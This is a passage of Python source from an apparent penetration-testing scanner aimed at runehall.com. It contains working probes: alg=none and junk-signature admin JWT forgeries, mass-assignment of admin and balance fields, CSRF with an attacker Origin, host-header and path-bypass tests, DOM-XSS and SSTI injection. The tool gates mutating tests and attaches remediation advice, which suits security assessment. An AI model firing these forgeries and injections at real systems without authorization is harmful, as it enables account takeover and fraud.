            ("zero", {"amount": 0, "currency": "USD", "_probe": "aio-amt-zero"}),
            ("overflow", {"amount": 1e308, "currency": "USD", "_probe": "aio-amt-overflow"}),
            ("string_overflow", {"amount": "999999999999999999999999", "currency": "USD", "_probe": "aio-amt-strovf"}),
        ]
        for label, body in payloads:
            try:
                r = self.http_post(url, headers=self.auth_headers(), json_body=body, timeout=8)
                accepted = 200 <= r.status_code < 300
                sev = "CRITICAL" if accepted else "INFO"
                detail = (
                    f"Server ACCEPTED {label} amount (HTTP {r.status_code})."
                    if accepted else
                    f"Server rejected {label} amount (HTTP {r.status_code}) — expected."
                )
                self.report["casino_amount_validation"].append(finding(
                    sev, detail,
                    fix="Validate amount as a finite positive number within balance and game limits server-side.",
                    url=url, category="casino_amount_validation", payload_label=label,
                    verdict=(Verdict.FAIL if accepted else Verdict.PASS).value,
                ))
                self.log.info("  [=] %s: HTTP %s", label, r.status_code)
            except Exception as e:
                self.report["errors"].append(f"Amount validation ({label}) error: {e}")

    def test_auth_jwt_forgery(self) -> None:
        self.log.info("Auth JWT forgery attempts (alg=none / alg-confusion)...")
        if not self.cfg.run_stateful:
            self.log.info("[skip] RUN_STATEFUL=False — forgery attempts not fired.")
            self.report["auth_jwt_forgery"].append(finding(
                "INFO",
                "JWT forgery attempts skipped (RUN_STATEFUL=False). Enable with AUTH_TEST_ENDPOINT to probe acceptance.",
                fix="Server must reject alg=none and enforce the expected algorithm (no HS* accept when RS* configured).",
                category="auth_jwt_forgery",
            ))
            return
        path = self.cfg.auth_test_endpoint
        if not path:
            self.log.info("[skip] AUTH_TEST_ENDPOINT not configured.")
            self.report["auth_jwt_forgery"].append(finding(
                "INFO",
                "AUTH_TEST_ENDPOINT empty — forgery attempts not fired.",
                fix="Set AIO_AUTH_TEST_ENDPOINT to a staging authenticated route (e.g. /api/wallet/balance).",
                category="auth_jwt_forgery",
            ))
            return
        url = urljoin(self.cfg.target_url, path)
        if "staging" not in (urlparse(url).hostname or ""):
            self.log.warning("[skip] Resolved AUTH_TEST_ENDPOINT host is not staging — refusing forgery attempts.")
            return

        base_payload = {
            "sub": "aio-forgery-probe",
            "role": "admin",
            "isAdmin": True,
            "iat": int(datetime.now(timezone.utc).timestamp()),
            "exp": int(datetime.now(timezone.utc).timestamp()) + 3600,
            "_probe": "aio-jwt-forgery-v7",
        }
        attempts = [
            ("alg_none_lower", self._craft_unsigned_jwt({"alg": "none", "typ": "JWT"}, base_payload)),
            ("alg_none_upper", self._craft_unsigned_jwt({"alg": "None", "typ": "JWT"}, base_payload)),
            ("alg_none_NONE", self._craft_unsigned_jwt({"alg": "NONE", "typ": "JWT"}, base_payload)),
            ("alg_hs256_empty_sig", self._craft_unsigned_jwt({"alg": "HS256", "typ": "JWT"}, base_payload)),
            (
                "alg_hs256_junk_sig",
                # Keep three JWT parts: header.payload.signature ([:-1] ate the trailing dot)
                self._craft_unsigned_jwt({"alg": "HS256", "typ": "JWT"}, base_payload).rstrip(".")
                + "."
                + self._b64url(b"not-a-real-signature"),
            ),
        ]
        for label, token in attempts:
            try:
                r = self.http_get(
                    url,
                    headers={"Authorization": f"Bearer {token}", "Content-Type": "application/json"},
                    timeout=8, allow_redirects=False,
                )
                accepted = 200 <= r.status_code < 300
                sev = "CRITICAL" if accepted else "INFO"
                self.report["auth_jwt_forgery"].append(finding(
                    sev,
                    (
                        f"Forged token '{label}' ACCEPTED (HTTP {r.status_code})."
                        if accepted else
                        f"Forged token '{label}' rejected (HTTP {r.status_code}) — expected."
                    ),
                    fix="Reject alg=none; pin expected alg; verify signature with the correct key material; never trust client alg header alone.",
                    url=url, category="auth_jwt_forgery", attempt=label,
                    verdict=(Verdict.FAIL if accepted else Verdict.PASS).value,
                ))
                self.log.info("  [=] %s: HTTP %s", label, r.status_code)
            except Exception as e:
                self.report["errors"].append(f"JWT forgery ({label}) error: {e}")

    def run_zap(self) -> None:
        if not shutil.which("docker"):
            return
        if not self.cfg.enable_zap:
            self.log.info("ZAP skipped (set AIO_ENABLE_ZAP=true to enable).")
            return
        self.log.info("Running ZAP full scan (docker)...")
        replacer = (
            "rules.100000.description=Auth Header;"
            "rules.100000.url=.*;"
            "rules.100000.matchType=REQ_HEADER;"
            "rules.100000.matchString=Authorization;"
            f"rules.100000.replacement=Bearer {self.cfg.user_a_jwt}"
        )
        cmd = [
            "docker", "run", "--rm", "-v", f"{os.getcwd()}:/zap/wrk/:rw",
            "-t", "ghcr.io/zaproxy/zaproxy:stable", "zap-full-scan.py",
            "-t", self.cfg.target_url, "-J", "zap_report.json", "-r", "zap_report.html",
            "-z", replacer, "-m", "5",
        ]
        try:
            subprocess.run(cmd, check=True, timeout=900, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            self.report["errors"].append(f"ZAP error: {e}")


    # ------------------------------------------------------------------
    # Phase runner
    # ------------------------------------------------------------------
    async def _run_phase(self, name: str, selected: Sequence[str]) -> PhaseResult:
        pr = PhaseResult(name=name, status="skipped", started_at=_utc_now_iso())
        if name not in selected:
            pr.reason = "not selected"
            pr.finished_at = _utc_now_iso()
            return pr

        t0 = time.monotonic()
        pr.status = "ran"
        try:
            if name == "recon":
                pr.modules = [
                    "audit_security_headers", "run_subfinder", "check_rate_limiting",
                    "test_http_method_tampering", "test_auth_cookie_flags", "test_auth_session_fixation",
                    "test_host_header", "test_subdomain_takeover",
                ]
                self.audit_security_headers()
                self.run_subfinder()
                self.check_rate_limiting()
                self.test_http_method_tampering()
                self.test_auth_cookie_flags()
                self.test_auth_session_fixation()
                self.test_host_header()
                self.test_subdomain_takeover()

            elif name == "passive":
                pr.modules = [
                    "run_spa_playwright", "scan_casino_payout_integrity",
                    "scan_casino_bonus_rollover", "scan_casino_freespin_scatter",
                    "scan_casino_provably_fair",
                ]
                await self.run_spa_playwright()
                # Casino read-only consolidated module
                self.casino.scan_payout_integrity()
                self.casino.scan_bonus_rollover()
                self.casino.scan_freespin_scatter()
                self.casino.scan_provably_fair()

            elif name == "active_safe":
                pr.modules = [
                    "test_reflected_xss_candidates", "test_ssrf_param_candidates",
                    "test_auth_oauth_redirect", "test_bola", "test_open_redirect",
                    "run_nuclei", "run_access_control_matrix", "test_path_bypass",
                    "test_csrf", "test_mass_assignment", "test_xss_dom",
                    "test_hpp", "test_injection", "test_graphql_deep",
                    "test_ssrf_real", "test_jwt_advanced",
                    "test_casino_amount_validation_note",
                ]
                self.test_reflected_xss_candidates()
                self.test_ssrf_param_candidates()
                self.test_auth_oauth_redirect()
                self.test_bola()
                self.test_open_redirect()
                self.run_nuclei()
                # v8 active-safe additions (mutating paths self-gate on RUN_STATEFUL)
                self.run_access_control_matrix()
                self.test_path_bypass()
                self.test_csrf()
                self.test_mass_assignment()
                await self.test_xss_dom()
                # v8 second-wave active-safe modules (mutating/forgery self-gate inside)
                self.test_hpp()
                self.test_injection()
                self.test_graphql_deep()
                self.test_ssrf_real()
                self.test_jwt_advanced()
                # Amount note (no-ops unless stateful — still records INFO when false)
                if not self.cfg.run_stateful:
                    self.test_casino_amount_validation()

            elif name == "stateful":
                if not self.cfg.run_stateful:
                    pr.status = "skipped"
                    pr.reason = "RUN_STATEFUL=False"
                    pr.modules = []
                else:
                    pr.modules = [
                        "test_casino_race_v2", "test_casino_amount_validation",
                        "test_auth_jwt_forgery", "run_zap",
                    ]
                    # v8: prefer the real barrier-synchronized concurrent race (v2)
                    self.test_casino_race_v2()
                    self.test_casino_amount_validation()
                    self.test_auth_jwt_forgery()
                    # Bonus/freespin stateful tails already ran inside passive-phase
                    # casino module when RUN_STATEFUL=True (avoid duplicate findings).
                    self.run_zap()
            else:
                pr.status = "skipped"
                pr.reason = f"unknown phase {name}"
        except Exception as e:
            pr.status = "failed"
            pr.reason = str(e)
            self.report["errors"].append(f"Phase {name} failed: {e}")
            self.log.exception("Phase %s failed", name)

        pr.duration_s = round(time.monotonic() - t0, 3)
        pr.finished_at = _utc_now_iso()
        return pr

    async def execute(self) -> int:
        """Run selected phases; return process exit code."""
        try:
            self.cfg.validate()
        except ValueError as e:
            self.log.error("Config validation failed: %s", e)
            return EXIT_CONFIG_ERROR

        self.preflight_check()
        try:
            selected = resolve_phases(self.cfg.phases)
        except ValueError as e:
            self.log.error("%s", e)
            return EXIT_CONFIG_ERROR

        self.report["phases_executed"] = selected[:]
        self.log.info("INITIATING MAX AIO RED OPS v%s: %s", VERSION, self.cfg.target_url)
        self.log.info("AUTHORIZED=%s | RUN_STATEFUL=%s | phases=%s",
                      self.cfg.authorized, self.cfg.run_stateful, ",".join(selected))

        for phase in PHASE_ORDER:
            self.log.info("---- PHASE: %s ----", phase)
            result = await self._run_phase(phase, selected)
            self._phase_results.append(result)
            self.report["phase_results"].append(asdict(result))
            self.log.info(
                "Phase %s → %s (%.2fs)%s",
                phase, result.status, result.duration_s,
                f" [{result.reason}]" if result.reason else "",
            )

        self.report["business_logic"] = self.casino.business_logic_rollup()
        self.generate_reports()
        return self._exit_code()


    # ==================================================================
    # v8: endpoint discovery helper + authed Playwright contexts
    # ==================================================================
    def _candidate_api_paths(self) -> List[str]:
        paths: Set[str] = set()
        for entry in self.report.get("api_endpoints", []) or []:
            parts = str(entry).split(" ", 1)
            p = parts[1] if len(parts) == 2 else parts[0]
            if p.startswith("/"):
                paths.add(p)
        for req in self.intercepted_requests:
            pp = urlparse(req["url"]).path
            if pp.startswith("/"):
                paths.add(pp)
        for ep in self.cfg.casino_endpoints().values():
            if ep and ep.startswith("/"):
                paths.add(ep)
        return sorted(paths)

    async def _authed_context(self, p, which: str = "A"):
        """Launch a browser + context for an identity.

        which="A"/"B" inject Authorization header + the configured auth cookie
        (AIO_AUTH_COOKIE_NAME, default 'access_token') scoped to the target host.
        which=None (or an unconfigured JWT) yields a clean unauthenticated context.
        """
        browser = await p.chromium.launch(headless=True)
        jwt: Optional[str] = None
        if which == "A" and self.jwt_configured("A"):
            jwt = self.cfg.user_a_jwt
        elif which == "B" and self.jwt_configured("B"):
            jwt = self.cfg.user_b_jwt
        extra = {"Authorization": f"Bearer {jwt}"} if jwt else {}
        ctx = await browser.new_context(
            user_agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Runehall-MaxAIO/8",
            extra_http_headers=extra,
        )
        if jwt:
            host = urlparse(self.cfg.target_url).hostname
            await ctx.add_cookies([{
                "name": self.cfg.auth_cookie_name,
                "value": jwt,
                "domain": host,
                "path": "/",
                "httpOnly": True,
                "secure": True,
                "sameSite": "Lax",
            }])
        return browser, ctx

    @staticmethod
    def _looks_like_login(resp) -> bool:
        try:
            if "login" in str(getattr(resp, "url", "")).lower():
                return True
            body = (resp.text or "")[:4000].lower()
        except Exception:
            return False
        markers = ("sign in", "log in", "login", "password", "authenticate", "forgot password")
        return any(m in body for m in markers)

    # ==================================================================
    # v8: access-control matrix (unauth / A / B across methods)
    # ==================================================================
    def run_access_control_matrix(self) -> None:
        self.log.info("Access-control matrix (unauth/A/B across HTTP methods)...")
        identities: Dict[str, Dict[str, str]] = {"unauth": {}}
        if self.jwt_configured("A"):
            identities["A"] = self.auth_headers(self.cfg.user_a_jwt)
        if self.jwt_configured("B"):
            identities["B"] = self.auth_headers(self.cfg.user_b_jwt)
        paths = self._candidate_api_paths()
        if not paths:
            self.log.info("[skip] access-control matrix: no API endpoints discovered yet.")
            return
        for path in paths[:40]:
            url = urljoin(self.cfg.target_url, path)
            if "runehall.com" not in url:
                continue
            for method in ACCESS_MATRIX_METHODS:
                # Mutating verbs only fire with RUN_STATEFUL (they can change state)
                if method in ("POST", "PUT", "PATCH", "DELETE") and not self.cfg.run_stateful:
                    continue
                resp: Dict[str, Tuple[int, str, int]] = {}
                for ident, headers in identities.items():
                    try:
                        r = self.http_request(method, url, headers=dict(headers),
                                              allow_redirects=False, timeout=8)
                        content = getattr(r, "content", b"") or b""
                        resp[ident] = (r.status_code, hashlib.sha256(content).hexdigest(), len(content))
                    except Exception:
                        continue
                if "unauth" in resp and resp["unauth"][0] == 200 and (
                    (resp.get("A", (0,))[0] in (401, 403)) or (resp.get("B", (0,))[0] in (401, 403))
                ):
                    self._add("access_control_matrix", finding(
                        "HIGH",
                        f"Unauthenticated {method} {path} returns 200 while an authenticated identity is rejected.",
                        fix="Require authentication/authorization server-side on this route.",
                        url=url, category="access_control_matrix", method=method,
                        verdict=Verdict.FAIL.value,
                        replay={"method": method, "path": path, "identity": "unauth", "expect": "status!=200 or login"},
                    ))
                if "A" in resp and "B" in resp and resp["A"][0] == 200 and resp["B"][0] == 200 \
                        and resp["A"][1] == resp["B"][1] and resp["A"][2] > 20:
                    self._add("access_control_matrix", finding(
                        "HIGH",
                        f"{method} {path} returns byte-identical content for user A and user B (possible IDOR / missing object scoping).",
                        fix="Scope responses to the authenticated principal; enforce object-level authorization.",
                        url=url, category="access_control_matrix", method=method,
                        verdict=Verdict.FAIL.value,
                    ))
                if method in ("POST", "PUT", "PATCH", "DELETE") and "unauth" in resp \
                        and resp["unauth"][0] in (200, 201, 204):
                    self._add("access_control_matrix", finding(
                        "CRITICAL",
                        f"Unauthenticated {method} {path} succeeded ({resp['unauth'][0]}).",
                        fix="Block unauthenticated mutating requests; enforce auth before any side effect.",
                        url=url, category="access_control_matrix", method=method,
                        verdict=Verdict.FAIL.value,
                    ))

    # ==================================================================
    # v8: path / encoding auth-bypass probes
    # ==================================================================
    def test_path_bypass(self) -> None:
        self.log.info("Path/encoding auth-bypass probes...")
        base_status: Optional[int] = None
        try:
            base = self.http_get(urljoin(self.cfg.target_url, "/admin"),
                                 allow_redirects=False, timeout=8)
            base_status = base.status_code
        except Exception as e:
            self._add("path_bypass", finding(
                "INFO", f"Baseline /admin probe failed: {e}",
                category="path_bypass", verdict=Verdict.INCONCLUSIVE.value))
        for variant in PATH_BYPASS:
            url = urljoin(self.cfg.target_url, variant)
            if "runehall.com" not in url:
                continue
            try:
                r = self.http_get(url, allow_redirects=False, timeout=8)
            except Exception:
                continue
            if r.status_code == 200 and not self._looks_like_login(r):
                sev = "MEDIUM"
                if any(s in variant for s in ("/admin", "actuator")):
                    sev = "HIGH"
                if any(s in variant for s in (".git", ".env", "swagger", "api-docs", "openapi")):
                    sev = "HIGH"
                self._add("path_bypass", finding(
                    sev,
                    f"Path variant {variant!r} returned 200 (not a login page) — possible auth bypass or sensitive exposure.",
                    fix="Normalize/decode paths before authorization; block dotfiles, VCS metadata, actuator, metrics, and API docs in staging/prod.",
                    url=url, category="path_bypass", baseline_admin_status=base_status,
                    verdict=Verdict.FAIL.value,
                    replay={"method": "GET", "path": variant, "expect": "status!=200 or login"},
                ))

    # ==================================================================
    # v8: CSRF posture (token presence + CORS-CSRF chain + cross-origin accept)
    # ==================================================================
    def test_csrf(self) -> None:
        self.log.info("CSRF posture probes...")
        evil = "https://evil-attacker.com"
        for path in self._candidate_api_paths()[:30]:
            url = urljoin(self.cfg.target_url, path)
            if "runehall.com" not in url:
                continue
            try:
                pre = self.http_request("OPTIONS", url,
                                        headers={"Origin": evil, "Access-Control-Request-Method": "POST"},
                                        timeout=6)
                acao = pre.headers.get("Access-Control-Allow-Origin", "")
                acac = pre.headers.get("Access-Control-Allow-Credentials", "")
                if acao == evil and acac.lower() == "true":
                    self._add("csrf", finding(
                        "CRITICAL",
                        f"CORS-CSRF chain on {path}: preflight reflects attacker Origin with credentials allowed.",
                        fix="Never reflect arbitrary Origin with Access-Control-Allow-Credentials:true; require anti-CSRF tokens / SameSite cookies.",
                        url=url, category="csrf", verdict=Verdict.FAIL.value))
            except Exception:
                pass
            if self.cfg.run_stateful:
                try:
                    r = self.http_post(url, json_body={"_aio_csrf_probe": True},
                                       headers={"Origin": evil}, allow_redirects=False, timeout=8)
                    if r.status_code in (200, 201, 204):
                        self._add("csrf", finding(
                            "HIGH",
                            f"Cross-origin POST to {path} with attacker Origin and no CSRF token was accepted ({r.status_code}).",
                            fix="Enforce anti-CSRF tokens and/or SameSite=strict/lax cookies on state-changing routes.",
                            url=url, category="csrf", verdict=Verdict.FAIL.value,
                            replay={"method": "POST", "path": path, "identity": "unauth", "expect": "status!=200"}))
                except Exception:
                    pass
        for pg in ("/login", "/forgot-password", "/reset-password", "/register"):
            url = urljoin(self.cfg.target_url, pg)
            try:
                r = self.http_get(url, timeout=8)
                body = (r.text or "")
                if r.status_code == 200 and "<form" in body.lower() and not re.search(
                        r"(csrf|xsrf|authenticity_token|__requestverificationtoken)", body, re.I):
                    self._add("csrf", finding(
                        "MEDIUM",
                        f"Form at {pg} has no visible anti-CSRF token field.",
                        fix="Embed a per-session anti-CSRF token in every state-changing form.",
                        url=url, category="csrf", verdict=Verdict.FAIL.value))
            except Exception:
                continue

    # ==================================================================
    # v8: mass assignment / over-posting (mutating => RUN_STATEFUL)
    # ==================================================================
    def test_mass_assignment(self) -> None:
        self.log.info("Mass-assignment / over-posting probes...")
        if not self.cfg.run_stateful:
            self._add("mass_assignment", finding(
                "INFO",
                "Mass-assignment injection is mutating; RUN_STATEFUL=False so it was not fired.",
                category="mass_assignment", verdict=Verdict.INCONCLUSIVE.value))
            return
        headers = self.auth_headers(self.cfg.user_a_jwt) if self.jwt_configured("A") else {}
        injected: Dict[str, Any] = {}
        for f in MASS_ASSIGN_FIELDS:
            if f in ("isAdmin", "is_admin", "admin", "isPaid", "is_paid", "verified",
                     "emailVerified", "isVip", "banned", "frozen"):
                injected[f] = True
            elif f in ("role", "roles", "kycStatus", "kyc_status", "permissions", "accountType"):
                injected[f] = "admin"
            else:
                injected[f] = 999999
        for path in self._candidate_api_paths()[:25]:
            url = urljoin(self.cfg.target_url, path)
            if "runehall.com" not in url:
                continue
            for method in ("POST", "PUT", "PATCH"):
                try:
                    r = self.http_request(method, url, json=injected,
                                          headers=dict(headers), allow_redirects=False, timeout=8)
                except Exception:
                    continue
                if r.status_code in (200, 201):
                    body = (r.text or "")[:8000]
                    echoed = [f for f in MASS_ASSIGN_FIELDS if re.search(rf'"{re.escape(f)}"\s*:', body)]
                    if echoed:
                        self._add("mass_assignment", finding(
                            "CRITICAL",
                            f"{method} {path} echoed injected privileged field(s): {', '.join(echoed)}.",
                            fix="Whitelist bindable fields server-side; never bind client input to privileged attributes (role/isAdmin/balance/kycStatus/permissions).",
                            url=url, category="mass_assignment", method=method, echoed=echoed,
                            verdict=Verdict.FAIL.value))

    # ==================================================================
    # v8: host-header / routing injection (read-only GET)
    # ==================================================================
    def test_host_header(self) -> None:
        self.log.info("Host-header / routing injection probes...")
        for pg in HOST_TARGET_PATHS:
            url = urljoin(self.cfg.target_url, pg)
            if "runehall.com" not in url:
                continue
            for hdr in HOST_HEADER_NAMES:
                for payload in HOST_PAYLOADS:
                    try:
                        r = self.http_get(url, headers={hdr: payload},
                                          allow_redirects=False, timeout=6)
                    except Exception:
                        continue
                    loc = r.headers.get("Location", "")
                    try:
                        body = (r.text or "")[:6000]
                    except Exception:
                        body = ""
                    if payload in loc or payload in body:
                        where = "Location header" if payload in loc else "response body"
                        self._add("host_header", finding(
                            "HIGH",
                            f"{hdr}: {payload!r} reflected in {where} at {pg} — host-header injection (cache poisoning / password-reset link hijack) risk.",
                            fix="Validate Host / X-Forwarded-Host against an allowlist; build absolute URLs from server config, not request headers.",
                            url=url, category="host_header", header=hdr, payload=payload,
                            verdict=Verdict.FAIL.value,
                            replay={"method": "GET", "path": pg, "expect": "status!=200"}))

    # ==================================================================
    # v8: subdomain takeover fingerprinting (over discovered subdomains)
    # ==================================================================
    def test_subdomain_takeover(self) -> None:
        self.log.info("Subdomain-takeover fingerprinting...")
        subs = self.report.get("subdomains") or []
        if not subs:
            self.log.info("[skip] no subdomains discovered (subfinder not run / empty).")
            return
        for host in list(subs)[:60]:
            host = str(host).strip()
            if not host or not host.endswith("runehall.com"):
                continue
            matched = False
            for scheme in ("https", "http"):
                try:
                    r = self.http_get(f"{scheme}://{host}/", allow_redirects=True, timeout=8)
                except Exception:
                    continue
                try:
                    body = (r.text or "")[:8000]
                except Exception:
                    body = ""
                low = body.lower()
                for service, fps in TAKEOVER_FP.items():
                    if any(sig.lower() in low for sig in fps):
                        self._add("subdomain_takeover", finding(
                            "CRITICAL",
                            f"Subdomain {host} shows a {service} takeover fingerprint (dangling CNAME to an unclaimed service).",
                            fix=f"Remove the dangling DNS record for {host} or re-claim the {service} resource.",
                            url=f"{scheme}://{host}/", category="subdomain_takeover", service=service,
                            verdict=Verdict.FAIL.value))
                        matched = True
                        break
                if matched:
                    break

    # ==================================================================
    # v8: DOM-XSS via sink instrumentation (authed Playwright page)
    # ==================================================================
    async def test_xss_dom(self) -> None:
        self.log.info("DOM-XSS sink-instrumentation probe...")
        if self.cfg.skip_playwright or not HAS_PLAYWRIGHT:
            self.log.info("[skip] DOM-XSS needs Playwright.")
            return
        params: Set[str] = set()
        for req in self.intercepted_requests:
            for k in parse_qs(urlparse(req["url"]).query):
                params.add(k)
        params.update({"q", "search", "redirect", "returnUrl", "next", "name", "ref", "msg", "error"})
        which = "A" if self.jwt_configured("A") else "unauth"
        try:
            async with async_playwright() as p:
                browser, ctx = await self._authed_context(p, which)
                page = await ctx.new_page()
                await page.add_init_script(DOM_SINK_INIT_JS)
                try:
                    for payload in XSS_PAYLOADS:
                        for param in list(params)[:8]:
                            marker = f"aioxss{abs(hash((param, payload))) % 100000}"
                            pl = payload.replace("AIOMARK", marker)
                            target = urljoin(self.cfg.target_url, "/?" + urlencode({param: pl}))
                            if "runehall.com" not in target:
                                continue
                            try:
                                await page.goto(target, wait_until="networkidle", timeout=20000)
                                fired = await page.evaluate("() => (window.__xss || [])")
                            except Exception:
                                continue
                            hit = [e for e in (fired or []) if marker in json.dumps(e)]
                            if hit:
                                self._add("dom_xss", finding(
                                    "HIGH",
                                    f"DOM-XSS: param {param!r} flowed into a dangerous sink ({hit[0].get('sink')}) and executed.",
                                    fix="Encode/escape untrusted input before DOM insertion; avoid innerHTML/outerHTML/eval/document.write with user data; prefer textContent / Trusted Types.",
                                    url=target, category="dom_xss", sink=hit[0].get("sink"), param=param,
                                    verdict=Verdict.FAIL.value))
                                try:
                                    await page.evaluate("() => { window.__xss = []; }")
                                except Exception:
                                    pass
                finally:
                    await browser.close()
        except Exception as e:
            with self._report_lock:
                self.report["errors"].append(f"DOM-XSS probe error: {e}")

    # ==================================================================
    # v8: finding ids + history diff + replay
    # ==================================================================
    @staticmethod
    def _finding_id(category: str, f: Dict[str, Any]) -> str:
        basis = "|".join([
            category,
            str(f.get("severity", "")),
            str(f.get("detail") or f.get("name") or ""),
            str(f.get("url") or f.get("matched_at") or ""),
            str(f.get("method") or ""),
            str(f.get("payload") or f.get("param") or f.get("header") or ""),
        ])
        return hashlib.sha1(basis.encode()).hexdigest()[:16]

    def _load_history(self) -> Dict[str, Any]:
        try:
            if os.path.exists(self.cfg.history_file):
                with open(self.cfg.history_file) as fh:
                    return json.load(fh)
        except Exception as e:
            self.log.warning("History read failed: %s", e)
        return {"runs": []}

    @staticmethod
    def _history_record(cat: str, item: Dict[str, Any]) -> Dict[str, Any]:
        return {
            "id": item.get("id"), "category": cat, "severity": item.get("severity"),
            "detail": item.get("detail") or item.get("name"),
            "url": item.get("url") or item.get("matched_at"),
            "method": item.get("method"), "replay": item.get("replay"),
            "verdict": item.get("verdict"),
        }

    def _assign_ids_and_history(self):
        stored: List[Tuple[str, Dict[str, Any]]] = []
        for cat in self.REPORT_CATEGORIES:
            if cat in ("api_endpoints", "subdomains"):
                continue
            for item in self.report.get(cat, []):
                if isinstance(item, dict):
                    item["id"] = self._finding_id(cat, item)
                    item.setdefault("category", cat)
                    stored.append((cat, item))
        prev = None
        prev_ids: Set[str] = set()
        if self.cfg.enable_history:
            runs = self._load_history().get("runs", [])
            if runs:
                prev = runs[-1]
                prev_ids = set(prev.get("finding_ids", []))
        cur_ids: Set[str] = set()
        for _, item in stored:
            fid = item["id"]
            cur_ids.add(fid)
            item["status"] = "existing" if fid in prev_ids else ("new" if prev_ids else "baseline")
        fixed: List[Dict[str, Any]] = []
        if prev:
            prev_findings = {pf.get("id"): pf for pf in prev.get("findings", [])}
            for pid in prev_ids - cur_ids:
                pf = prev_findings.get(pid, {})
                fixed.append({"id": pid, "category": pf.get("category"),
                              "severity": pf.get("severity"), "detail": pf.get("detail")})
        self.report["fixed_since_last_run"] = fixed
        self.report["history_prev_run"] = prev.get("timestamp") if prev else None
        self.report["history_delta"] = {
            "new": sum(1 for _, i in stored if i.get("status") == "new"),
            "existing": sum(1 for _, i in stored if i.get("status") == "existing"),
            "baseline": sum(1 for _, i in stored if i.get("status") == "baseline"),
            "fixed": len(fixed),
        }
        return stored, cur_ids

    def _save_history(self, cur_ids: Set[str], stored: List[Tuple[str, Dict[str, Any]]]) -> None:
        if not self.cfg.enable_history:
            return
        hist = self._load_history()
        runs = hist.get("runs", [])
        runs.append({
            "timestamp": self.report.get("completed_at") or self.start_time,
            "version": VERSION,
            "target": self.cfg.target_url,
            "finding_ids": sorted(cur_ids),
            "severity_breakdown": self.report.get("summary", {}).get("severity_breakdown", {}),
            "findings": [self._history_record(cat, i) for cat, i in stored],
        })
        hist["runs"] = runs[-20:]
        try:
            with open(self.cfg.history_file, "w") as fh:
                json.dump(hist, fh, indent=2, default=str)
            self.log.info("History updated: %s (%d run(s) retained)", self.cfg.history_file, len(hist["runs"]))
        except Exception as e:
            self.log.warning("Could not write history file: %s", e)

    def _replay_http(self, target: Dict[str, Any], replay: Dict[str, Any]):
        """Re-issue a stored finding's request. Return True if still vulnerable,
        False if the condition no longer holds, None if inconclusive."""
        method = replay.get("method", "GET")
        path = replay.get("path") or urlparse(target.get("url") or "").path
        if not path:
            return None
        url = urljoin(self.cfg.target_url, path)
        if "runehall.com" not in url:
            return None
        ident = replay.get("identity")
        headers: Dict[str, str] = {}
        if ident == "A" and self.jwt_configured("A"):
            headers = self.auth_headers(self.cfg.user_a_jwt)
        elif ident == "B" and self.jwt_configured("B"):
            headers = self.auth_headers(self.cfg.user_b_jwt)
        try:
            r = self.http_request(method, url, headers=headers, allow_redirects=False, timeout=8)
        except Exception as e:
            self.log.warning("Replay request failed: %s", e)
            return None
        expect = replay.get("expect", "")
        if "status!=200" in expect:
            if r.status_code != 200:
                return False
            if "login" in expect and self._looks_like_login(r):
                return False
            return True
        return r.status_code == 200


    # ==================================================================
    # v8 (second wave): OOB helper + six additional modules
    # ==================================================================
    def _oob(self) -> Optional[str]:
        h = (self.cfg.oob_host or "").strip()
        return h or None

    # ---- 1. HTTP parameter pollution -------------------------------
    def test_hpp(self) -> None:
        self.log.info("HTTP parameter pollution (HPP) probes...")
        paths = self._candidate_api_paths() or ["/"]
        for path in paths[:20]:
            url = urljoin(self.cfg.target_url, path)
            if "runehall.com" not in url:
                continue
            for key, normal, evil in HPP_PAYLOADS:
                gated = key in HPP_VALUE_CHANGING
                # GET duplicate-param variant (value-changing keys need RUN_STATEFUL)
                if (not gated) or self.cfg.run_stateful:
                    try:
                        q = f"{key}={normal}&{key}={evil}"
                        full = url + ("&" if "?" in url else "?") + q
                        r = self.http_get(full, allow_redirects=False, timeout=8)
                        body = (r.text or "")[:8000]
                        if 200 <= r.status_code < 300 and evil and evil in body:
                            self._add("hpp", finding(
                                "HIGH",
                                f"HPP: duplicate '{key}' — evil value {evil!r} reflected/honored (GET) at {path}.",
                                fix="Reject or canonicalize duplicate parameters server-side; bind one authoritative value.",
                                url=full, category="hpp", param=key,
                                evidence=f"evil={evil!r} echoed; status={r.status_code}",
                                verdict=Verdict.FAIL.value,
                                replay={"method": "GET", "path": path + ("&" if "?" in path else "?") + q, "expect": "status!=200"}))
                    except Exception:
                        pass
                # mutating array variant — always gated behind RUN_STATEFUL
                if self.cfg.run_stateful:
                    for method in ("POST", "PUT", "PATCH"):
                        try:
                            r = self.http_request(method, url, json={key: [normal, evil]},
                                                  headers=dict(self.auth_headers() or {}),
                                                  allow_redirects=False, timeout=8)
                            body = (r.text or "")[:8000]
                            if 200 <= r.status_code < 300 and evil and evil in body:
                                self._add("hpp", finding(
                                    "HIGH",
                                    f"HPP: array '{key}':[{normal!r},{evil!r}] — evil value honored via {method} at {path}.",
                                    fix="Reject duplicate/array params; apply last-wins only with validation.",
                                    url=url, category="hpp", param=key, method=method,
                                    evidence=f"evil={evil!r} echoed; status={r.status_code}",
                                    verdict=Verdict.FAIL.value))
                        except Exception:
                            continue

    # ---- 2. Injection (SSTI / XXE / CMDi / NoSQLi / LDAPi) ----------
    def test_injection(self) -> None:
        self.log.info("Injection probes (SSTI/XXE/CMDi/NoSQLi/LDAPi)...")
        oob = self._oob()
        paths = self._candidate_api_paths() or ["/"]
        for path in paths[:15]:
            url = urljoin(self.cfg.target_url, path)
            if "runehall.com" not in url:
                continue
            for param in INJECT_PARAMS:
                for cls, payloads in INJECT_PROBES.items():
                    if cls.endswith("_oob") and not oob:
                        continue  # skip blind variants with no collaborator
                    for raw in payloads:
                        if isinstance(raw, dict):
                            op, val = next(iter(raw.items()))
                            qp = {f"{param}[{op}]": "" if val is None else str(val)}
                            op_label = op
                        else:
                            payload = raw.replace("OOB", oob) if oob else raw
                            qp = {param: payload}
                            op_label = None
                        full = url + ("&" if "?" in url else "?") + urlencode(qp)
                        try:
                            r = self.http_get(full, allow_redirects=False, timeout=8)
                        except Exception:
                            continue
                        body = (r.text or "")[:9000]
                        ok2xx = 200 <= r.status_code < 300
                        if cls == "ssti" and "49" in body and "7*7" not in body:
                            self._add("injection", finding(
                                "CRITICAL",
                                f"SSTI: param {param!r} evaluated a template expression (7*7=49) at {path}.",
                                fix="Never render user input as a template; use context-safe templating with autoescaping.",
                                url=full, category="injection", param=param, kind="ssti",
                                evidence="'49' present, '7*7' absent", verdict=Verdict.FAIL.value))
